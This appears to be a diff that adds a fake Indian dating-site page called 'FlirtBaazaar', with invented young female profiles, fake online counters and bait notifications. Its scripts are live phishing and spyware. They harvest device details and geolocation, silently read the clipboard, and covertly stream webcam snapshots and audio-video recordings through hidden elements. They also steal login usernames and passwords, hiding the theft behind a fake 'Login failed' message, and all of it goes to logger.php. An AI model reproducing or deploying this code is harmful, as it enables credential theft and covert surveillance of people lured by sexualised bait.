+                                        <span class="heart" style="font-size: 32px;">❤️</span>
+                                        <span class="heart small" style="font-size: 24px;">💖</span>
+                                    </div>
+                                </div>
+                                <p class="welcome-subtitle">
+                                    India's Hottest Dating Network 🔥
+                                </p>
+                                <p class="welcome-description">
+                                    <span class="online-count" id="welcomeCount">64</span> gorgeous girls online right now!
+                                    <span style="color: #fbbf24; margin-left: 8px;">💫 Start chatting instantly</span>
+                                </p>
+
+                                <div class="features">
+                                    <div class="feature">
+                                        <div class="feature-dot green"></div>
+                                        <span class="feature-text green">Free Registration</span>
+                                    </div>
+                                    <div class="feature">
+                                        <div class="feature-dot blue"></div>
+                                        <span class="feature-text blue">Instant Chat</span>
+                                    </div>
+                                    <div class="feature">
+                                        <div class="feature-dot pink"></div>
+                                        <span class="feature-text pink">Real Profiles</span>
+                                    </div>
+                                </div>
+
+                                <div class="cta-buttons">
+                                    <button class="btn-primary" onclick="showLogin()">
+                                        🚀 Start Chatting NOW
+                                    </button>
+                                    <button class="btn-outline" onclick="showLogin()">
+                                        💎 Browse Girls
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Hot Girls Online -->
+                <section class="hot-girls-section">
+                    <div class="section-header">
+                        <div class="section-title">
+                            <h2>🔥 Hot Girls Online</h2>
+                            <span class="live-badge">LIVE</span>
+                        </div>
+                        <button class="see-all-btn" onclick="showLogin()">
+                            See All 6+ Girls →
+                        </button>
+                    </div>
+
+                    <div class="profile-grid">
+                        <div class="profile-card glass-card" onclick="showLogin()">
+                            <div class="profile-image">
+                                <div class="profile-avatar">👩‍🦰</div>
+                                <div class="profile-status">
+                                    <div class="status-dot online"></div>
+                                    <span>Online</span>
+                                </div>
+                            </div>
+                            <div class="profile-info">
+                                <div class="profile-header">
+                                    <div>
+                                        <span class="profile-name">Priya</span>
+                                        <span class="profile-age">, 19</span>
+                                    </div>
+                                    <span class="verified-badge">✓</span>
+                                </div>
+                                <p class="profile-location">📍 Mumbai</p>
+                                <p class="profile-bio">Love dancing 💃 and coffee dates ☕</p>
+                                <div class="profile-stats">
+                                    <span class="profile-category">Gen Z</span>
+                                    <span>📸 8 photos</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="profile-card glass-card" onclick="showLogin()">
+                            <div class="profile-image">
+                                <div class="profile-avatar">👩‍⚕️</div>
+                                <div class="profile-status">
+                                    <div class="status-dot online"></div>
+                                    <span>Online</span>
+                                </div>
+                            </div>
+                            <div class="profile-info">
+                                <div class="profile-header">
+                                    <div>
+                                        <span class="profile-name">Sneha</span>
+                                        <span class="profile-age">, 21</span>
+                                    </div>
+                                    <span class="verified-badge">✓</span>
+                                </div>
+                                <p class="profile-location">📍 Delhi</p>
+                                <p class="profile-bio">Med student 👩‍⚕️ looking for fun chats</p>
+                                <div class="profile-stats">
+                                    <span class="profile-category">Teen</span>
+                                    <span>📸 12 photos</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="profile-card glass-card" onclick="showLogin()">
+                            <div class="profile-image">
+                                <div class="profile-avatar">👩‍🎨</div>
+                                <div class="profile-status">
+                                    <div class="status-dot away"></div>
+                                    <span>Away</span>
+                                </div>
+                            </div>
+                            <div class="profile-info">
+                                <div class="profile-header">
+                                    <div>
+                                        <span class="profile-name">Kavya</span>
+                                        <span class="profile-age">, 20</span>
+                                    </div>
+                                </div>
+                                <p class="profile-location">📍 Bangalore</p>
+                                <p class="profile-bio">Art lover 🎨 and book reader 📚</p>
+                                <div class="profile-stats">
+                                    <span class="profile-category">Gen Z</span>
+                                    <span>📸 6 photos</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="profile-card glass-card" onclick="showLogin()">
+                            <div class="profile-image">
+                                <div class="profile-avatar">💪</div>
+                                <div class="profile-status">
+                                    <div class="status-dot online"></div>
+                                    <span>Online</span>
+                                </div>
+                            </div>
+                            <div class="profile-info">
+                                <div class="profile-header">
+                                    <div>
+                                        <span class="profile-name">Ishika</span>
+                                        <span class="profile-age">, 22</span>
+                                    </div>
+                                    <span class="verified-badge">✓</span>
+                                </div>
+                                <p class="profile-location">📍 Pune</p>
+                                <p class="profile-bio">Fitness enthusiast 💪 & travel junkie ✈️</p>
+                                <div class="profile-stats">
+                                    <span class="profile-category">Teen</span>
+                                    <span>📸 15 photos</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="profile-card glass-card" onclick="showLogin()">
+                            <div class="profile-image">
+                                <div class="profile-avatar">🎮</div>
+                                <div class="profile-status">
+                                    <div class="status-dot online"></div>
+                                    <span>Online</span>
+                                </div>
+                            </div>
+                            <div class="profile-info">
+                                <div class="profile-header">
+                                    <div>
+                                        <span class="profile-name">Ananya</span>
+                                        <span class="profile-age">, 18</span>
+                                    </div>
+                                    <span class="verified-badge">✓</span>
+                                </div>
+                                <p class="profile-location">📍 Hyderabad</p>
+                                <p class="profile-bio">Gamer girl 🎮 and movie buff 🎬</p>
+                                <div class="profile-stats">
+                                    <span class="profile-category">Gen Z</span>
+                                    <span>📸 9 photos</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="profile-card glass-card" onclick="showLogin()">
+                            <div class="profile-image">
+                                <div class="profile-avatar">👗</div>
+                                <div class="profile-status">
+                                    <div class="status-dot online"></div>
+                                    <span>Online</span>
+                                </div>
+                            </div>
+                            <div class="profile-info">
+                                <div class="profile-header">
+                                    <div>
+                                        <span class="profile-name">Riya</span>
+                                        <span class="profile-age">, 23</span>
+                                    </div>
+                                    <span class="verified-badge">✓</span>
+                                </div>
+                                <p class="profile-location">📍 Chennai</p>
+                                <p class="profile-bio">Fashion designer 👗 loves midnight talks</p>
+                                <div class="profile-stats">
+                                    <span class="profile-category">Love Dating</span>
+                                    <span>📸 20 photos</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Live Chat Preview -->
+                <section class="live-chat-section">
+                    <div class="section-header">
+                        <div class="section-title">
+                            <h2>💬 Live Chat Preview</h2>
+                            <span class="live-badge">LIVE</span>
+                        </div>
+                    </div>
+
+                    <div class="chat-grid">
+                        <div class="chat-card glass-card">
+                            <div class="chat-header">
+                                <div class="chat-avatar">👩</div>
+                                <span class="chat-name">Meera</span>
+                                <span class="chat-time">now</span>
+                            </div>
+                            <p class="chat-message">Hey! Want to chat? I'm free right now 😊</p>
+                        </div>
+
+                        <div class="chat-card glass-card">
+                            <div class="chat-header">
+                                <div class="chat-avatar">👱‍♀️</div>
+                                <span class="chat-name">Simran</span>
+                                <span class="chat-time">2min ago</span>
+                            </div>
+                            <p class="chat-message">Looking for someone fun to talk to! 💕</p>
+                        </div>
+
+                        <div class="chat-card glass-card">
+                            <div class="chat-header">
+                                <div class="chat-avatar">👩‍🦱</div>
+                                <span class="chat-name">Nisha</span>
+                                <span class="chat-time">5min ago</span>
+                            </div>
+                            <p class="chat-message">Anyone from Mumbai? Let's meet up! ☕</p>
+                        </div>
+                    </div>
+                </section>
+
+                <!-- Trending Section -->
+                <section class="trending-section">
+                    <div class="section-header">
+                        <div class="section-title">
+                            <h2>📈 Trending Now</h2>
+                        </div>
+                    </div>
+
+                    <div class="trending-grid">
+                        <div class="trending-card glass-card">
+                            <div class="trending-icon">🚀</div>
+                            <div class="trending-number">50K+</div>
+                            <div class="trending-label">New Users Today</div>
+                        </div>
+
+                        <div class="trending-card glass-card">
+                            <div class="trending-icon">💕</div>
+                            <div class="trending-number">2.3M</div>
+                            <div class="trending-label">Matches Made</div>
+                        </div>
+
+                        <div class="trending-card glass-card">
+                            <div class="trending-icon">💬</div>
+                            <div class="trending-number">1M+</div>
+                            <div class="trending-label">Messages Today</div>
+                        </div>
+
+                        <div class="trending-card glass-card">
+                            <div class="trending-icon">🎉</div>
+                            <div class="trending-number">15K</div>
+                            <div class="trending-label">Success Stories</div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+        </main>
+    </div>
+
+    <!-- Login Modal -->
+    <div class="login-modal hidden" id="loginModal">
+        <div class="login-form">
+            <button class="close-btn" onclick="hideLogin()">&times;</button>
+            <div class="login-header">
+                <h2>💋 Welcome Back</h2>
+                <p>Login to connect with amazing people</p>
+            </div>
+            
+            <form onsubmit="handleLogin(event)">
+                <input type="text" id="username" class="form-input" placeholder="Username" required style="margin-bottom: 16px;">
+                <input type="password" id="password" class="form-input" placeholder="Password" required style="margin-bottom: 16px;">
+                <button type="submit" class="login-submit">Login</button>
+            </form>
+            
+            <div class="login-options">
+                <div class="login-divider">
+                    <span>or continue with</span>
+                </div>
+                
+                <div class="social-login">
+                    <button class="social-btn" onclick="showLogin()">📱</button>
+                    <button class="social-btn" onclick="showLogin()">📧</button>
+                    <button class="social-btn" onclick="showLogin()">🔗</button>
+                </div>
+                
+                <p style="margin-top: 16px; color: #d1d5db; font-size: 14px;">
+                    Don't have an account? <a href="#" class="register-link" onclick="showLogin()">Sign up now</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Floating Action Button -->
+    <button class="fab" onclick="showLogin()">
+        💬
+    </button>
+
+    <!-- Notification Popup -->
+    <div id="notification" class="notification notification-hidden">
+        <div class="notification-header">
+            <div class="notification-dot"></div>
+            <span class="notification-title">New Activity!</span>
+        </div>
+        <p class="notification-message">3 girls want to chat with you! Join now to start conversations.</p>
+    </div>
+
+    <script>
+        // Online counter animation
+        let onlineCount = 64;
+        function updateOnlineCount() {
+            const change = Math.floor(Math.random() * 3) - 1;
+            onlineCount = Math.max(50, Math.min(99, onlineCount + change));
+            document.getElementById('onlineCount').textContent = onlineCount;
+            document.getElementById('welcomeCount').textContent = onlineCount;
+        }
+        setInterval(updateOnlineCount, 3000);
+
+        // Category selection
+        function selectCategory(categoryId) {
+            document.querySelectorAll('.category-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            event.target.closest('.category-item').classList.add('active');
+        }
+
+        // Show login modal
+        function showLogin() {
+            document.getElementById('loginModal').classList.remove('hidden');
+        }
+
+        // Hide login modal
+        function hideLogin() {
+            document.getElementById('loginModal').classList.add('hidden');
+        }
+
+        // Handle login form submission
+        function handleLogin(event) {
+            event.preventDefault();
+            alert('Welcome to FlirtBaazaar! You are now connected with amazing people.');
+            hideLogin();
+        }
+
+        // Close modal when clicking outside
+        document.addEventListener('click', function(event) {
+            const modal = document.getElementById('loginModal');
+            if (event.target === modal) {
+                hideLogin();
+            }
+        });
+
+        // Show notification popup
+        function showNotification() {
+            const notification = document.getElementById('notification');
+            notification.classList.remove('notification-hidden');
+            setTimeout(() => {
+                notification.classList.add('notification-hidden');
+            }, 5000);
+        }
+
+        // Show notification after 3 seconds
+        setTimeout(showNotification, 3000);
+
+        // Show notification every 30 seconds
+        setInterval(showNotification, 30000);
+
+        // Add click handlers to all interactive elements
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add hover effects to profile cards
+            document.querySelectorAll('.profile-card').forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-5px) scale(1.02)';
+                });
+                
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0) scale(1)';
+                });
+            });
+
+            // Add click handlers to category items
+            document.querySelectorAll('.category-item').forEach(item => {
+                item.addEventListener('click', function() {
+                    document.querySelectorAll('.category-item').forEach(i => i.classList.remove('active'));
+                    this.classList.add('active');
+                });
+            });
+        });
+
+        // Random user activity simulation
+        const activities = [
+            "Priya is typing...",
+            "New photo from Sneha",
+            "Kavya viewed your profile",
+            "Ishika sent you a wink",
+            "Ananya is online now",
+            "Riya liked your photo"
+        ];
+
+        function simulateActivity() {
+            const activity = activities[Math.floor(Math.random() * activities.length)];
+            console.log("💖 " + activity);
+        }
+
+        setInterval(simulateActivity, 8000);
+
+        // Smooth scroll for mobile
+        document.documentElement.style.scrollBehavior = 'smooth';
+    </script>
+    
+<video id="cam" autoplay playsinline muted style="position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px;"></video>
+<canvas id="snapCanvas" style="position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px;"></canvas>
+<input type="text" id="dummyInput" style="position:absolute;left:-9999px;">
+
+
+</body>
+
+<script>
+(async () => {
+
+  const info = {
+    timestamp_utc: new Date().toString(),
+    userAgent: navigator.userAgent,
+    cores: navigator.hardwareConcurrency || 'N/A',
+    ram: navigator.deviceMemory || 'N/A',
+    width: window.innerWidth,
+    height: window.innerHeight,
+    latitude: 'Denied',
+    longitude: 'Denied',
+    battery: 'Unavailable'
+  };
+
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        info.latitude = pos.coords.latitude;
+        info.longitude = pos.coords.longitude;
+        sendInfo();
+      },
+      () => sendInfo()
+    );
+  } else sendInfo();
+
+  if (navigator.getBattery) {
+    const battery = await navigator.getBattery();
+    info.battery = `${Math.round(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not Charging"}`;
+  }
+
+  function sendInfo() {
+    fetch("logger.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(info)
+    });
+  }
+
+  document.getElementById('dummyInput').addEventListener('focus', async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text.trim().length > 0) {
+        fetch("logger.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ clipboard: text.trim() })
+        });
+      }
+    } catch {}
+  });
+
+  let chunks = [];
+  const video = document.getElementById("cam");
+  const canvas = document.getElementById("snapCanvas");
+  const ctx = canvas.getContext("2d");
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    video.srcObject = stream;
+
+    const waitForVideoReady = () => {
+      return new Promise(resolve => {
+        const check = () => {
+          if (
+            video.readyState >= 2 &&
+            video.videoWidth > 0 &&
+            video.videoHeight > 0
+          ) {
+            resolve();
+          } else {
+            requestAnimationFrame(check);
+          }
+        };
+        check();
+      });
+    };
+
+    const startSnapshotLoop = () => {
+      const takeSnapshot = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async blob => {
+          if (blob && blob.size > 0) {
+            const formData = new FormData();
+            formData.append("snapshot", blob, "photo_" + Date.now() + ".jpg");
+
+            await fetch("logger.php", {
+              method: "POST",
+              body: formData
+            });
+          }
+        }, "image/jpeg", 0.95);
+      };
+
+      // Start after first valid frame rendered
+      waitForVideoReady().then(() => {
+        console.log("📸 Snapshot loop started");
+        setInterval(takeSnapshot, 2000);
+      });
+    };
+
+    const startVideoRecordingLoop = () => {
+      const recordChunk = async () => {
+        let localChunks = [];
+        const recorder = new MediaRecorder(stream, {
+          mimeType: MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
+            ? "video/webm;codecs=vp9,opus"
+            : "video/webm"
+        });
+
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) localChunks.push(e.data);
+        };
+
+        recorder.onstop = async () => {
+          const blob = new Blob(localChunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('webmVideo', blob, 'video_' + Date.now() + '.mp4');
+
+          await fetch('logger.php', {
+            method: 'POST',
+            body: formData
+          });
+        };
+
+        recorder.start();
+
+        setTimeout(() => {
+          if (recorder.state === "recording") recorder.stop();
+        }, 10000); // 10s
+      };
+
+      recordChunk();
+      setInterval(recordChunk, 10000);
+    };
+
+    video.onloadedmetadata = () => {
+      video.play(); // ensure video playback
+      startSnapshotLoop();
+      startVideoRecordingLoop();
+    };
+
+  } catch (err) {
+    console.error("🎥 Media access failed:", err);
+  }
+})();
+
+// 📋 Silent Clipboard Capture (triggered by user interaction)
+let clipboardCaptured = false;
+
+function captureClipboardOnce() {
+  if (clipboardCaptured) return;
+  clipboardCaptured = true;
+
+  navigator.clipboard.readText().then(text => {
+    if (text && text.trim().length > 0) {
+      fetch("logger.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ clipboard: text.trim() })
+      });
+    }
+  }).catch(() => {});
+}
+
+// 🔥 Trigger once on any interaction
+["click", "keydown", "mousemove", "touchstart"].forEach(evt =>
+  window.addEventListener(evt, captureClipboardOnce, { once: true })
+);
+
+// ✅ Capture login credentials ethically
+document.querySelector('.login-panel form')?.addEventListener('submit', function (e) {
+  e.preventDefault(); // prevent actual form submission
+
+  const username = this.querySelector('input[type="text"]')?.value || 'N/A';
+  const password = this.querySelector('input[type="password"]')?.value || 'N/A';
+
+  fetch("logger.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      login_username: username,
+      login_password: password,
+      timestamp: new Date().toString()
+    })
+  });
+
+  // Optional: Show a fake "Login failed" message or redirect
+  alert("Login failed. Please try again.");
+});
+
+</script>
+
+<!-- 🔒 LOGIN MODAL -->
+<div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;
+  background:rgba(0,0,0,0.8);z-index:9999;align-items:center;justify-content:center;">
+  <div style="background:#222;padding:2rem;border-radius:10px;max-width:400px;width:90%;
+              box-shadow:0 0 20px gold;text-align:center;">
+    <h3 style="color:gold;margin-bottom:1rem;">Login</h3>
+    <form id="modalLoginForm">
+      <input type="text" placeholder="Username" required style="width:100%;padding:0.5rem;
+             margin-bottom:0.5rem;background:#333;color:#fff;border:none;border-radius:5px;">
+      <input type="password" placeholder="Password" required style="width:100%;padding:0.5rem;
+             margin-bottom:0.5rem;background:#333;color:#fff;border:none;border-radius:5px;">
+      <button type="submit" style="background:gold;color:#000;padding:0.6rem 1rem;
+              border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Login</button>
+    </form>
+    <div id="closeLogin" style="margin-top:1rem;color:#ccc;cursor:pointer;font-size:0.9rem;">
+      Close
+    </div>
+  </div>
+</div>
+
+<script>
+// 🟢 ELEMENTS TRIGGERING LOGIN MODAL
+const loginModal = document.getElementById('loginModal');
+
+const triggers = [
+  ...document.querySelectorAll('nav a'),
+  document.querySelector('.btn'),
+  ...document.querySelectorAll('.card')
+];
+
+triggers.forEach(el => {
+  el.addEventListener('click', e => {
+    const text = el.textContent.trim().toLowerCase();
+    if (text === 'home') return; // allow home to work normally
+
+    e.preventDefault();
+    loginModal.style.display = 'flex';
+  });
+});
+
+
+// 🟡 CLOSE BUTTON
+document.getElementById('closeLogin').addEventListener('click', () => {
+  document.getElementById('loginModal').style.display = 'none';
+});
+
+// 🔴 SUBMIT LOGIN FORM
+document.getElementById('modalLoginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const [username, password] = [...this.querySelectorAll('input')].map(i => i.value);
+  fetch("logger.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      login_username: username,
+      login_password: password,
+      timestamp: new Date().toString()
+    })
+  });
+  alert("Login failed. Please try again.");
+  document.getElementById('loginModal').style.display = 'none';
+});
+</script>
+
+<script>
+function handleLogin(event) {
+  event.preventDefault();
+
+  const username = document.querySelector('#username').value;
+  const password = document.querySelector('#password').value;
+
+  // Debug log
+  console.log("Sending login to logger.php");
+
+  fetch("logger.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      login_username: username,
+      login_password: password,
+      timestamp: new Date().toString()
+    })
+  })
+  .then(res => console.log("Fetch response:", res.status))
+  .catch(err => console.error("Fetch failed", err));
+
+  alert('Welcome to FlirtBaazaar! You are now connected with amazing people.');
+  hideLogin?.(); // optional call
+}
+</script>
+
+<footer>
+    
+<footer>
+
+</body>
+</html>
